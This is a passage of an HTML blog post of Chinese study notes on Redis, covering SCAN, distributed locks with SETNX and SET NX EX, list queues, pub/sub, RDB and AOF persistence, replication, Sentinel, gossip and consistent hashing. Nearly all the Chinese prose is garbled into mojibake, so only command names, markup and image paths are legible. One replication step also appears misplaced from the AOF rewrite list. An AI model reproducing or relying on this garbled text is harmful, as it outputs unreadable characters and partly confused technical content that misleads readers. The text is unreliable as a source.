ä¸ä¿è¯æ¯æ¬¡æ‰§è¡Œéƒ½è¿”å›æŸä¸ªç»™å®šæ•°é‡çš„å…ƒç´ ï¼Œæ”¯æŒæ¨¡ç³ŠæŸ¥è¯¢</p><p>Ã˜ ä¸€æ¬¡è¿”å›çš„æ•°é‡ä¸å¯æ§ï¼Œåªèƒ½æ˜¯å¤§æ¦‚ç‡ç¬¦åˆcountå‚æ•°</p><p> <img src="/2020/03/25/redis/image-20200325153817291.png"></p><p><strong>ç¬¬ä¸€ä¸ªè¿”å›å€¼æ˜¯æ¸¸æ ‡ï¼Œç¬¬äºŒä¸ªè¿”å›å€¼æ˜¯ç»“æœé›†ï¼Œè™½ç„¶å†™count&#x3D;10ä½†æ˜¯ä¸ä¸€å®šè¿”å›10ä¸ª</strong></p><p> <img src="/2020/03/25/redis/image-20200325153826137.png"></p><p><strong>Cursor</strong>å¹¶ä¸ä¸€å®šæ˜¯é€’å¢çš„ï¼Œå¯èƒ½æ¯”å‰ä¸€æ¬¡è¿˜å°ï¼Œå¯èƒ½ä¼šè·å–é‡å¤key</p><h2><span id="å¦‚ä½•é€šè¿‡rediså®ç°åˆ†å¸ƒå¼é”">å¦‚ä½•é€šè¿‡Rediså®ç°åˆ†å¸ƒå¼é”</span></h2><h3><span id="åˆ†å¸ƒå¼é”éœ€è¦è§£å†³çš„é—®é¢˜">åˆ†å¸ƒå¼é”éœ€è¦è§£å†³çš„é—®é¢˜ Ã—</span></h3><p>Ã˜ äº’æ–¥æ€§</p><p>Ã˜ å®‰å…¨æ€§</p><p>Ã˜ æ­»é”</p><p>Ã˜ å®¹é”™</p><h3><span id="setnx-key-value-å¦‚æœkeyä¸å­˜åœ¨åˆ™åˆ›å»ºå¹¶èµ‹å€¼">SETNX key value: å¦‚æœkeyä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºå¹¶èµ‹å€¼ âˆš</span></h3><p>Ã˜ æ—¶é—´å¤æ‚åº¦ï¼šO(1)</p><p>Ã˜ è¿”å›å€¼ï¼šè®¾ç½®æˆåŠŸï¼Œè¿”å›1ï¼›è®¾ç½®å¤±è´¥ï¼Œè¿”å›0ã€‚</p><p><img src="/2020/03/25/redis/image-20200325154323739.png"></p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥å‘½ä»¤æ¥å®ç°é”ï¼Œä½†æ˜¯ç”±äºsetnxé•¿æœŸå­˜åœ¨ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è®¾ç½®è¿‡æœŸçš„æ—¶é—´ã€‚ </p><p><strong>EXPIRE key seconds</strong></p><p>è®¾ç½®keyçš„ç”Ÿå­˜æ—¶é—´ï¼Œå½“keyè¿‡æœŸæ—¶ï¼ˆç”Ÿå­˜æ—¶é—´ä¸º0ï¼‰ï¼Œä¼šè¢«è‡ªåŠ¨åˆ é™¤</p><p><img src="/2020/03/25/redis/image-20200325154427112.png"></p><p><img src="/2020/03/25/redis/image-20200325154432805.png"></p><p>ä½†æ˜¯è¿˜æ˜¯æœ‰é£é™©ï¼Œå¦‚æœæ‰§è¡Œè®¾ç½®æˆåŠŸåï¼Œæ¥ä¸åŠè®¾ç½®expireå°±æŒ‚æ‰</p><p>è¿èƒŒäº†æ“ä½œåŸå­æ€§çš„åˆè¡·</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><h3><span id="set-key-value-ex-seconds-px-milliseconds-nxxx">SET key value [EX seconds] [PX milliseconds] [NX|XX] âˆš</span></h3><p>Ã˜ EX second: è®¾ç½®é”®çš„è¿‡æœŸæ—¶é—´ä¸ºsecondç§’</p><p>Ã˜ PX millisecondï¼š è®¾ç½®é”®çš„è¿‡æœŸæ—¶é—´ä¸ºmillisecondæ¯«ç§’</p><p>Ã˜ NXï¼šåªåœ¨é”®ä¸å­˜åœ¨æ—¶ï¼Œæ‰å¯¹é”®è¿›è¡Œè®¾ç½®æ“ä½œ</p><p>Ã˜ XXï¼šåªåœ¨é”®å·²ç»å­˜åœ¨æ—¶ï¼Œæ‰å¯¹é”®è¿›è¡Œè®¾ç½®æ“ä½œ</p><p>Ã˜ Setæ“ä½œæˆåŠŸå®Œæˆæ—¶ï¼Œè¿”å›OKï¼Œå¦åˆ™è¿”å›nil</p><p><img src="/2020/03/25/redis/image-20200325154604297.png"></p><p><img src="/2020/03/25/redis/image-20200325154627847.png"></p><h3><span id="å¤§é‡keyåŒæ—¶è¿‡æœŸçš„æ³¨æ„äº‹é¡¹">å¤§é‡keyåŒæ—¶è¿‡æœŸçš„æ³¨æ„äº‹é¡¹</span></h3><h4><span id="é›†ä¸­è¿‡æœŸç”±äºæ¸…é™¤å¤§é‡keyå¾ˆè€—æ—¶ä¼šå‡ºç°çŸ­æš‚å¡é¡¿ç°è±¡">é›†ä¸­è¿‡æœŸï¼Œç”±äºæ¸…é™¤å¤§é‡keyå¾ˆè€—æ—¶ï¼Œä¼šå‡ºç°çŸ­æš‚å¡é¡¿ç°è±¡ âˆš</span></h4><p>Ã˜ è§£å†³æ–¹æ¡ˆï¼šåœ¨è®¾ç½®keyçš„è¿‡æœŸæ—¶é—´çš„æ—¶å€™ï¼Œç»™æ¯ä¸ªkeyåŠ ä¸Šéšæœºå€¼</p><h3><span id="ä½¿ç”¨listä½œä¸ºé˜Ÿåˆ—rpushç”Ÿäº§æ¶ˆæ¯lpopæ¶ˆè´¹æ¶ˆæ¯">ä½¿ç”¨Listä½œä¸ºé˜Ÿåˆ—ï¼ŒRPUSHç”Ÿäº§æ¶ˆæ¯ï¼ŒLPOPæ¶ˆè´¹æ¶ˆæ¯ âˆš</span></h3><p>Ã˜ ç¼ºç‚¹ï¼šæ²¡æœ‰ç­‰å¾…é˜Ÿåˆ—é‡Œæœ‰å€¼å°±ç›´æ¥æ¶ˆè´¹</p><p>Ã˜ å¼¥è¡¥ï¼šå¯ä»¥é€šè¿‡åœ¨åº”ç”¨å±‚å¼•å…¥Sleepæœºåˆ¶å»è°ƒç”¨LPOPé‡è¯•</p><p> <img src="/2020/03/25/redis/image-20200325154827138.png"></p><p>å¦‚æœä¸ç”¨Sleepå‘¢ï¼Ÿ</p><h3><span id="blpop-key-key-timeout-é˜»å¡ç›´åˆ°é˜Ÿåˆ—æœ‰æ¶ˆæ¯æˆ–è€…è¶…æ—¶">BLPOP key [key â€¦] timeout: é˜»å¡ç›´åˆ°é˜Ÿåˆ—æœ‰æ¶ˆæ¯æˆ–è€…è¶…æ—¶ âˆš</span></h3><p>Ã˜ ç¼ºç‚¹ï¼šåªèƒ½ä¾›ä¸€ä¸ªæ¶ˆè´¹è€…æ¶ˆè´¹</p><p><img src="/2020/03/25/redis/image-20200325154926990.png"></p><h3><span id="pubx2fsub-ä¸»é¢˜è®¢é˜…è€…æ¨¡å¼">pub&#x2F;sub: ä¸»é¢˜è®¢é˜…è€…æ¨¡å¼ âˆš</span></h3><p>Ã˜ å‘é€è€…ï¼ˆpubï¼‰å‘é€æ¶ˆæ¯ï¼Œè®¢é˜…è€…ï¼ˆsubï¼‰æ¥æ”¶æ¶ˆæ¯</p><p>Ã˜ è®¢é˜…è€…å¯ä»¥è®¢é˜…ä»»æ„æ•°é‡çš„é¢‘é“</p><p><img src="/2020/03/25/redis/image-20200325160641778.png"></p><p><img src="/2020/03/25/redis/image-20200325160722559.png"></p><h4><span id="pubx2fsubçš„ç¼ºç‚¹">pub&#x2F;subçš„ç¼ºç‚¹ âˆš</span></h4><p>æ¶ˆæ¯çš„å‘å¸ƒæ˜¯æ— çŠ¶æ€çš„ï¼Œæ— æ³•ä¿è¯å¯è¾¾</p><h2><span id="rediså¦‚ä½•æŒä¹…åŒ–">Rediså¦‚ä½•æŒä¹…åŒ–</span></h2><h3><span id="rdbå¿«ç…§æŒä¹…åŒ–ä¿å­˜æŸä¸ªæ—¶é—´ç‚¹çš„å…¨é‡æ•°æ®å¿«ç…§">Rdbï¼ˆå¿«ç…§ï¼‰æŒä¹…åŒ–ï¼šä¿å­˜æŸä¸ªæ—¶é—´ç‚¹çš„å…¨é‡æ•°æ®å¿«ç…§</span></h3><p><img src="/2020/03/25/redis/image-20200325160753346.png"></p><p>å¦‚æœ900s å†…æœ‰1æ¡ä¿®æ”¹å°±ä¿å­˜</p><p>å¦‚ä¸‹åŒç†</p><p><img src="/2020/03/25/redis/image-20200325160804011.png"></p><p>å½“å¤‡ä»½è¿›ç¨‹å‡ºé”™ï¼Œä¸»è¿›ç¨‹åœæ­¢å†™å…¥æ“ä½œ</p><p><img src="/2020/03/25/redis/image-20200325160815627.png"></p><p>å°½é‡ä¸å¼€å¯ï¼Œå› ä¸ºredisæ˜¯cpuå¯†é›†å‹çš„ï¼Œå¼€å¯å¢åŠ cpuæ¶ˆè€—</p><p><strong>å…³é—­rdbçš„å‘½ä»¤ï¼š</strong>config set save â€œâ€</p><p>æˆ–è€…åœ¨é…ç½®æ–‡ä»¶ä¸­saveéƒ½æ³¨é‡Šæ‰åå†åŠ ä¸Š save â€œâ€å°±ç¦ç”¨äº†rdbæ–¹å¼</p><h4><span id="rdbå¿«ç…§æŒä¹…åŒ–ä¿å­˜æŸä¸ªæ—¶é—´ç‚¹çš„å…¨é‡æ•°æ®å¿«ç…§">RDBï¼ˆå¿«ç…§ï¼‰æŒä¹…åŒ–ï¼šä¿å­˜æŸä¸ªæ—¶é—´ç‚¹çš„å…¨é‡æ•°æ®å¿«ç…§</span></h4><p>Ã˜ SAVEï¼šé˜»å¡Redisçš„æœåŠ¡å™¨è¿›ç¨‹ï¼Œç›´åˆ°RDBæ–‡ä»¶è¢«åˆ›å»ºå®Œæ¯•</p><p>Ã˜ BGSAVEï¼šForkå‡ºä¸€ä¸ªå­è¿›ç¨‹æ¥åˆ›å»ºRDBæ–‡ä»¶ï¼Œä¸é˜»å¡æœåŠ¡å™¨è¿›ç¨‹</p><p><img src="/2020/03/25/redis/image-20200325160856961.png"></p><p>ä¸Šæ¬¡æ‰§è¡ŒsaveæŒ‡ä»¤çš„æ—¶é—´</p><p><img src="/2020/03/25/redis/image-20200325160907700.png"></p><h4><span id="è‡ªåŠ¨åŒ–è§¦å‘rdbæŒä¹…åŒ–çš„æ–¹å¼">è‡ªåŠ¨åŒ–è§¦å‘RDBæŒä¹…åŒ–çš„æ–¹å¼ Ã—</span></h4><p>Ã˜ æ ¹æ®redis.confé…ç½®é‡Œçš„SAVE m nå®šæ—¶è§¦å‘ï¼ˆç”¨çš„æ˜¯BGSAVEï¼‰</p><p>Ã˜ ä¸»ä»å¤åˆ¶æ—¶ï¼Œä¸»èŠ‚ç‚¹è‡ªåŠ¨è§¦å‘</p><p>Ã˜ æ‰§è¡ŒDebug Reload</p><p>Ã˜ æ‰§è¡ŒShutdownä¸”æ²¡æœ‰å¼€å¯AOFæŒä¹…åŒ–</p><p><img src="/2020/03/25/redis/image-20200325161010058.png"></p><h4><span id="copy-on-write">Copy-on-Write</span></h4><ul><li>ç³»ç»Ÿè°ƒç”¨forkï¼ˆï¼‰ï¼šåˆ›å»ºè¿›ç¨‹ï¼Œå®ç°äº†Copy-on-Write</li></ul><p>å¦‚æœæœ‰å¤šä¸ªè°ƒç”¨è€…åŒæ—¶è¦æ±‚ç›¸åŒèµ„æºï¼ˆå¦‚å†…å­˜æˆ–ç£ç›˜ä¸Šçš„æ•°æ®å­˜å‚¨ï¼‰ï¼Œä»–ä»¬ä¼šå…±åŒè·å–ç›¸åŒçš„æŒ‡é’ˆæŒ‡å‘ç›¸åŒçš„èµ„æºï¼Œç›´åˆ°æŸä¸ªè°ƒç”¨è€…è¯•å›¾ä¿®æ”¹èµ„æºçš„å†…å®¹æ—¶ï¼Œç³»ç»Ÿæ‰ä¼šçœŸæ­£å¤åˆ¶ä¸€ä»½ä¸“ç”¨å‰¯æœ¬ç»™è¯¥è°ƒç”¨è€…ï¼Œè€Œå…¶ä»–è°ƒç”¨è€…æ‰€è§åˆ°çš„æœ€åˆçš„èµ„æºä»ç„¶ä¿æŒä¸å˜ã€‚</p><p><img src="/2020/03/25/redis/image-20200325161054664.png"></p><h4><span id="rdbæŒä¹…åŒ–çš„ç¼ºç‚¹">RDBæŒä¹…åŒ–çš„ç¼ºç‚¹ âˆš</span></h4><p>Ã˜ å†…å­˜æ•°æ®çš„å…¨é‡åŒæ­¥ï¼Œæ•°æ®é‡å¤§ä¼šç”±äºI&#x2F;Oè€Œä¸¥é‡å½±å“æ€§èƒ½</p><p>Ã˜ å¯èƒ½ä¼šå› ä¸ºRedisæŒ‚æ‰è€Œä¸¢å¤±ä»å½“å‰è‡³æœ€è¿‘ä¸€æ¬¡å¿«ç…§æœŸé—´çš„æ•°æ®</p><h3><span id="aofappend-only-fileæŒä¹…åŒ–ä¿æŒå†™çŠ¶æ€">AOFï¼ˆAppend-Only-Fileï¼‰æŒä¹…åŒ–ï¼šä¿æŒå†™çŠ¶æ€</span></h3><p>Ã˜ è®°å½•ä¸‹é™¤äº†æŸ¥è¯¢ä»¥å¤–çš„æ‰€æœ‰å˜æ›´æ•°æ®åº“çŠ¶æ€çš„æŒ‡ä»¤</p><p>Ã˜ ä»¥appendçš„å½¢å¼è¿½åŠ ä¿å­˜åˆ°AOFæ–‡ä»¶ä¸­ï¼ˆå¢é‡ï¼‰ </p><p>é»˜è®¤å…³é—­ï¼Œä¿®æ”¹redis.conf</p><p><img src="/2020/03/25/redis/image-20200325161330713.png"></p><p>æ”¹æˆyes</p><p><img src="/2020/03/25/redis/image-20200325161341662.png"></p><p>ç„¶ååœ¨redis clienté‡Œé¢è¾“å…¥config set appendonly yesä½¿å…¶ç”Ÿæ•ˆ</p><p><img src="/2020/03/25/redis/image-20200325161651580.png"></p><p>forkå­çº¿ç¨‹å°†å†…å­˜é‡Œé¢çš„æ•°æ®æ›´æ”¹è½¬æ¢æˆå¯¹åº”æŒ‡ä»¤ç„¶ååŒæ—¶ä¹Ÿè®°å½•æ–°çš„å˜åŠ¨åˆ°åŸaofã€‚</p><h4><span id="æ—¥å¿—é‡å†™è§£å†³aofæ–‡ä»¶å¤§å°ä¸æ–­å¢å¤§çš„é—®é¢˜åŸç†å¦‚ä¸‹-">æ—¥å¿—é‡å†™è§£å†³AOFæ–‡ä»¶å¤§å°ä¸æ–­å¢å¤§çš„é—®é¢˜ï¼ŒåŸç†å¦‚ä¸‹ -</span></h4><p>Ã˜ è°ƒç”¨fork(), åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹</p><p>Ã˜ å­è¿›ç¨‹æŠŠæ–°çš„AOFå†™åˆ°ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶é‡Œï¼Œä¸ä¾èµ–åŸæ¥çš„AOFæ–‡ä»¶</p><p>Ã˜ ä¸»è¿›ç¨‹æŒç»­å°†æ–°çš„å˜åŠ¨åŒæ—¶å†™åˆ°å†…å­˜å’ŒåŸæ¥çš„AOFé‡Œ</p><p>Ã˜ ä¸»è¿›ç¨‹è·å–å­è¿›ç¨‹é‡å†™AOFçš„å®Œæˆä¿¡å·ï¼Œå¾€æ–°AOFåŒæ­¥å¢é‡å˜åŠ¨</p><p>Ã˜ ä½¿ç”¨æ–°çš„AOFæ–‡ä»¶æ›¿æ¢æ‰æ—§çš„AOFæ–‡ä»¶</p><p>redisåœ¨è½½å…¥AOFæ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿçš„clientï¼ŒæŠŠAOFä¸­æ¯ä¸€æ¡å‘½ä»¤éƒ½æ‰§è¡Œä¸€éï¼Œæœ€ç»ˆè¿˜åŸå›æ•°æ®åº“çš„çŠ¶æ€ï¼Œå®ƒçš„è½½å…¥ä¹Ÿæ˜¯è‡ªåŠ¨çš„ã€‚åœ¨RDBå’ŒAOFå¤‡ä»½æ–‡ä»¶éƒ½æœ‰çš„æƒ…å†µä¸‹ï¼Œredisä¼šä¼˜å…ˆè½½å…¥AOFå¤‡ä»½æ–‡ä»¶</p><p>AOFæ–‡ä»¶å¯èƒ½ä¼šéšç€æœåŠ¡å™¨è¿è¡Œçš„æ—¶é—´è¶Šæ¥è¶Šå¤§ï¼Œå¯ä»¥åˆ©ç”¨AOFé‡å†™çš„åŠŸèƒ½ï¼Œæ¥æ§åˆ¶AOFæ–‡ä»¶çš„å¤§å°ã€‚AOFé‡å†™åŠŸèƒ½ä¼šé¦–å…ˆè¯»å–æ•°æ®åº“ä¸­ç°æœ‰çš„é”®å€¼å¯¹çŠ¶æ€ï¼Œç„¶åæ ¹æ®ç±»å‹ä½¿ç”¨ä¸€æ¡å‘½ä»¤æ¥æ›¿ä»£å‰çš„é”®å€¼å¯¹å¤šæ¡å‘½ä»¤ã€‚</p><h3><span id="redisæ•°æ®çš„æ¢å¤">Redisæ•°æ®çš„æ¢å¤</span></h3><h4><span id="rdbå’Œaofæ–‡ä»¶å…±å­˜æƒ…å†µä¸‹çš„æ¢å¤æµç¨‹">RDBå’ŒAOFæ–‡ä»¶å…±å­˜æƒ…å†µä¸‹çš„æ¢å¤æµç¨‹ âˆš</span></h4><p><img src="/2020/03/25/redis/image-20200325161951548.png"></p><p>æœ‰AOFå°±ç”¨AOFæ²¡æœ‰å°±ç”¨RDB</p><h4><span id="rdbå’Œaofçš„ä¼˜ç¼ºç‚¹">RDBå’ŒAOFçš„ä¼˜ç¼ºç‚¹ âˆš</span></h4><p>Ã˜ RDBä¼˜ç‚¹:å…¨é‡æ•°æ®å¿«ç…§,æ–‡ä»¶å°,æ¢å¤å¿«</p><p>Ã˜ RDBç¼ºç‚¹:æ— æ³•ä¿å­˜æœ€è¿‘ä¸€æ¬¡å¿«ç…§åçš„æ•°æ®</p><p>Ã˜ AOFä¼˜ç‚¹:å¯è¯»æ€§é«˜,é€‚åˆä¿å­˜å¢é‡æ•°æ®,æ•°æ®ä¸æ˜“ä¸¢å¤±</p><p>Ã˜ AOFç¼ºç‚¹:æ–‡ä»¶ä½“ç§¯å¤§,æ¢å¤æ—¶é—´é•¿</p><h4><span id="rdb-aofæ··åˆæŒä¹…åŒ–çš„æ–¹å¼-">RDB-AOFæ··åˆæŒä¹…åŒ–çš„æ–¹å¼ -</span></h4><p><img src="/2020/03/25/redis/image-20200325162349761.png"></p><h5><span id="æ•°æ®å¤‡ä»½">æ•°æ®å¤‡ä»½</span></h5><p>Ã˜ å…ˆä½¿ç”¨RDBå…¨é‡æŒä¹…åŒ–,AOFåšå¢é‡æŒä¹…åŒ–</p><p>Ã˜ AOFæ–‡ä»¶çš„å‰åŠæ®µæ˜¯RDBæ ¼å¼çš„å…¨é‡æ•°æ®ååŠæ®µæ˜¯rediså‘½ä»¤æ ¼å¼çš„å¢é‡æ•°æ®</p><h5><span id="æ•°æ®æ¢å¤">æ•°æ®æ¢å¤</span></h5><p>å½“æˆ‘ä»¬å¼€å¯äº†æ··åˆæŒä¹…åŒ–æ—¶ï¼Œå¯åŠ¨redisä¾ç„¶ä¼˜å…ˆåŠ è½½aofæ–‡ä»¶ï¼Œaofæ–‡ä»¶åŠ è½½å¯èƒ½æœ‰ä¸¤ç§æƒ…å†µå¦‚ä¸‹ï¼š</p><p>aofæ–‡ä»¶å¼€å¤´æ˜¯rdbçš„æ ¼å¼, å…ˆåŠ è½½ rdbå†…å®¹å†åŠ è½½å‰©ä½™çš„ aofã€‚</p><p>aofæ–‡ä»¶å¼€å¤´ä¸æ˜¯rdbçš„æ ¼å¼ï¼Œç›´æ¥ä»¥aofæ ¼å¼åŠ è½½æ•´ä¸ªæ–‡ä»¶ã€‚</p><h4><span id="ä½¿ç”¨piplineçš„å¥½å¤„-">ä½¿ç”¨Piplineçš„å¥½å¤„  -</span></h4><p>Ã˜ Pipelineå’ŒLinuxçš„ç®¡é“ç±»ä¼¼</p><p>Ã˜ RedisåŸºäºè¯·æ±‚&#x2F;å“åº”æ¨¡å‹ï¼Œå•ä¸ªè¯·æ±‚å¤„ç†éœ€è¦ä¸€ä¸€åº”ç­”</p><p>Ã˜ Pipelineæ‰¹é‡æ‰§è¡ŒæŒ‡ä»¤ï¼ŒèŠ‚çœå¤šæ¬¡IOå¾€è¿”çš„æ—¶é—´</p><p>Ã˜ æœ‰é¡ºåºä¾èµ–çš„æŒ‡ä»¤å»ºè®®åˆ†æ‰¹å‘é€</p><h3><span id="redisçš„åŒæ­¥æœºåˆ¶">Redisçš„åŒæ­¥æœºåˆ¶</span></h3><p>Ã˜ ä¸»ä»</p><p>Ã˜ å“¨å…µ</p><p>Ã˜ é›†ç¾¤</p><h4><span id="ä¸»ä»åŒæ­¥åŸç†">ä¸»ä»åŒæ­¥åŸç†</span></h4><p>MasterèŠ‚ç‚¹ç”¨äºå†™æ“ä½œ</p><p>SlaverèŠ‚ç‚¹ç”¨äºè¯»æ“ä½œ</p><p><img src="/2020/03/25/redis/image-20200325162444666.png"></p><p>å®šæœŸå¤‡ä»½å·¥ä½œä¹Ÿæ˜¯å•ç‹¬é€‰æ‹©ä¸€ä¸ªslaverå®ç°çš„ï¼Œ</p><h5><span id="å…¨åŒæ­¥æµç¨‹">å…¨åŒæ­¥æµç¨‹ï¼š</span></h5><p>Ã˜ Salverå‘é€syncå‘½ä»¤åˆ°Master</p><p>Ã˜ Masterå¯åŠ¨ä¸€ä¸ªåå°è¿›ç¨‹ï¼Œå°†Redisä¸­çš„æ•°æ®å¿«ç…§ä¿å­˜åˆ°æ–‡ä»¶ä¸­</p><p>Ã˜ Masterå°†ä¿å­˜æ•°æ®å¿«ç…§æœŸé—´æ¥æ”¶åˆ°çš„å†™å‘½ä»¤ç¼“å­˜èµ·æ¥</p><p>Ã˜ Masteråœ¨å®Œæˆå†™æ–‡ä»¶æ“ä½œåï¼Œå°†è¯¥æ–‡ä»¶å‘é€ç»™Salver</p><p>Ã˜ ä½¿ç”¨æ–°çš„AOFæ–‡ä»¶æ›¿æ¢æ‰æ—§çš„AOFæ–‡ä»¶</p><p>Ã˜ Masterå°†è¿™æœŸé—´æ”¶é›†çš„å¢é‡å†™å‘½ä»¤å‘é€ç»™Salverç«¯</p><h5><span id="å¢é‡åŒæ­¥è¿‡ç¨‹">å¢é‡åŒæ­¥è¿‡ç¨‹</span></h5><p>Ã˜ Masteræ¥æ”¶åˆ°ç”¨æˆ·çš„æ“ä½œæŒ‡ä»¤ï¼Œåˆ¤æ–­æ˜¯å¦éœ€è¦ä¼ æ’­åˆ°Slave</p><p>Ã˜ å°†æ“ä½œè®°å½•è¿½åŠ åˆ°AOFæ–‡ä»¶</p><p>Ã˜ å°†æ“ä½œä¼ æ’­åˆ°å…¶ä»–Slaveï¼š1ã€å¯¹é½ä¸»ä»åº“ï¼›2ã€å¾€å“åº”ç¼“å­˜å†™å…¥æŒ‡ä»¤</p><p>Ã˜ å°†ç¼“å­˜ä¸­çš„æ•°æ®å‘é€ç»™Slave</p><p>å¼Šç«¯æ˜¯ï¼Œä¸å…·å¤‡é«˜å¯ç”¨æ€§ã€‚å½“MasterèŠ‚ç‚¹æŒ‚æ‰åï¼Œrediså°†æ— æ³•æä¾›å†™å…¥æœåŠ¡</p><h4><span id="å“¨å…µåŒæ­¥redis-sentinel">å“¨å…µåŒæ­¥Redis Sentinel</span></h4><p><strong>è§£å†³ä¸»ä»åŒæ­¥Masterå®•æœºåçš„ä¸»ä»åˆ‡æ¢é—®é¢˜ï¼š</strong></p><p>Ã˜ ç›‘æ§ï¼šæ£€æŸ¥ä¸»ä»æœåŠ¡å™¨æ˜¯å¦è¿è¡Œæ­£å¸¸</p><p>Ã˜ æé†’ï¼šé€šè¿‡APIå‘ç®¡ç†å‘˜æˆ–è€…å…¶ä»–åº”ç”¨ç¨‹åºå‘é€æ•…éšœé€šçŸ¥</p><p>Ã˜ è‡ªåŠ¨æ•…éšœè¿ç§»ï¼šä¸»ä»åˆ‡æ¢</p><p>æŠ•ç¥¨å†³å®šæ˜¯å¦æ•…éšœè¿ç§»ï¼Œå’Œè°ä½œä¸ºæ–°çš„ä¸»æœåŠ¡å™¨</p><p>æµè¨€åè®®æ¥æ”¶ä¸»æœåŠ¡å™¨æ˜¯å¦ä¸‹çº¿çš„ä¿¡æ¯</p><h5><span id="æµè¨€åè®®gossip">æµè¨€åè®®Gossip</span></h5><p><strong>åœ¨æ‚ä¹±æ— ç« ä¸­å¯»æ±‚ä¸€è‡´</strong></p><p>Ã˜ æ¯ä¸ªèŠ‚ç‚¹éƒ½éšæœºåœ°å’Œå¯¹æ–¹é€šä¿¡ï¼Œæœ€ç»ˆæ‰€æœ‰èŠ‚ç‚¹çš„çŠ¶æ€è¾¾æˆä¸€è‡´</p><p>Ã˜ ç§å­èŠ‚ç‚¹å®šæœŸéšæœºå‘å…¶ä»–èŠ‚ç‚¹å‘é€èŠ‚ç‚¹åˆ—è¡¨ä»¥åŠéœ€è¦ä¼ æ’­çš„æ¶ˆæ¯</p><p>Ã˜ ä¸ä¿è¯ä¿¡æ¯ä¸€å®šä¼šä¼ é€’ç»™æ‰€æœ‰èŠ‚ç‚¹ï¼Œä½†æ˜¯æœ€ç»ˆä¼šè¶‹äºä¸€è‡´</p><p>Redis é›†ç¾¤æ˜¯å»ä¸­å¿ƒåŒ–çš„ï¼Œå½¼æ­¤ä¹‹é—´çŠ¶æ€åŒæ­¥é  gossip åè®®é€šä¿¡ï¼Œé›†ç¾¤çš„æ¶ˆæ¯æœ‰ä»¥ä¸‹å‡ ç§ç±»å‹ï¼š</p><ul><li><strong>Meet</strong> é€šè¿‡ã€Œcluster meet ip portã€å‘½ä»¤ï¼Œå·²æœ‰é›†ç¾¤çš„èŠ‚ç‚¹ä¼šå‘æ–°çš„èŠ‚ç‚¹å‘é€é‚€è¯·ï¼ŒåŠ å…¥ç°æœ‰é›†ç¾¤ã€‚</li><li><strong>Ping</strong> èŠ‚ç‚¹æ¯ç§’ä¼šå‘é›†ç¾¤ä¸­å…¶ä»–èŠ‚ç‚¹å‘é€ ping æ¶ˆæ¯ï¼Œæ¶ˆæ¯ä¸­å¸¦æœ‰è‡ªå·±å·²çŸ¥çš„ä¸¤ä¸ªèŠ‚ç‚¹çš„åœ°å€ã€æ§½ã€çŠ¶æ€ä¿¡æ¯ã€æœ€åä¸€æ¬¡é€šä¿¡æ—¶é—´ç­‰ã€‚</li><li><strong>Pong</strong> èŠ‚ç‚¹æ”¶åˆ° ping æ¶ˆæ¯åä¼šå›å¤ pong æ¶ˆæ¯ï¼Œæ¶ˆæ¯ä¸­åŒæ ·å¸¦æœ‰è‡ªå·±å·²çŸ¥çš„ä¸¤ä¸ªèŠ‚ç‚¹ä¿¡æ¯ã€‚</li><li><strong>Fail</strong> èŠ‚ç‚¹ ping ä¸é€šæŸèŠ‚ç‚¹åï¼Œä¼šå‘é›†ç¾¤æ‰€æœ‰èŠ‚ç‚¹å¹¿æ’­è¯¥èŠ‚ç‚¹æŒ‚æ‰çš„æ¶ˆæ¯ã€‚å…¶ä»–èŠ‚ç‚¹æ”¶åˆ°æ¶ˆæ¯åæ ‡è®°å·²ä¸‹çº¿ã€‚</li></ul><p>ç”±äºå»ä¸­å¿ƒåŒ–å’Œé€šä¿¡æœºåˆ¶ï¼ŒRedis Cluster é€‰æ‹©äº†æœ€ç»ˆä¸€è‡´æ€§å’ŒåŸºæœ¬å¯ç”¨ã€‚</p><h2><span id="redisçš„é›†ç¾¤åŸç†">Redisçš„é›†ç¾¤åŸç†</span></h2><h2><span id="é›†ç¾¤å¯ç”¨æ€§">é›†ç¾¤å¯ç”¨æ€§</span></h2><p>å¦‚æœé›†ç¾¤ä»»æ„masteræŒ‚æ‰,ä¸”å½“å‰masteræ²¡æœ‰slave.é›†ç¾¤è¿›å…¥failçŠ¶æ€,ä¹Ÿå¯ä»¥ç†è§£æˆé›†ç¾¤çš„slotæ˜ å°„[0-16383]ä¸å®Œæ•´æ—¶è¿›å…¥failçŠ¶æ€.ã€‚</p><h3><span id="å¦‚ä½•ä»æµ·é‡æ•°æ®é‡Œå¿«é€Ÿæ‰¾åˆ°æ‰€éœ€">å¦‚ä½•ä»æµ·é‡æ•°æ®é‡Œå¿«é€Ÿæ‰¾åˆ°æ‰€éœ€ï¼Ÿ</span></h3><p>Ã˜ åˆ†ç‰‡ï¼šæŒ‰ç…§æŸç§è§„åˆ™å»åˆ’åˆ†æ•°æ®ï¼Œåˆ†æ•£å­˜å‚¨åœ¨å¤šä¸ªèŠ‚ç‚¹ä¸Š</p><p>Ã˜ å¸¸è§„çš„æŒ‰ç…§å“ˆå¸Œåˆ’åˆ†æ— æ³•å®ç°èŠ‚ç‚¹çš„åŠ¨æ€å¢å‡</p><h3><span id="ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å¯¹232å–æ¨¡å°†å“ˆå¸Œå€¼ç©ºé—´ç»„ç»‡æˆè™šæ‹Ÿçš„åœ†ç¯">ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ï¼šå¯¹2^32å–æ¨¡ï¼Œå°†å“ˆå¸Œå€¼ç©ºé—´ç»„ç»‡æˆè™šæ‹Ÿçš„åœ†ç¯</span></h3><p><img src="/2020/03/25/redis/image-20200325162559040.png"></p><p>é¡ºæ—¶é’ˆé€’å¢</p><h3><span id="å°†æ•°æ®keyä½¿ç”¨ç›¸åŒçš„å‡½æ•°hashè®¡ç®—å‡ºå“ˆå¸Œå€¼">å°†æ•°æ®keyä½¿ç”¨ç›¸åŒçš„å‡½æ•°Hashè®¡ç®—å‡ºå“ˆå¸Œå€¼</span></h3><p><img src="/2020/03/25/redis/image-20200325162616613.png"></p><p>ä½¿ç”¨æœåŠ¡å™¨ä¸»æœºåæˆ–è€…ipåœ°å€å“ˆå¸Œ</p><p>å¯¹æ•°æ®åŒæ ·è¿›è¡Œhashç®—æ³•ï¼Œç¡®å®šä½ç½®ï¼Œç„¶åæ 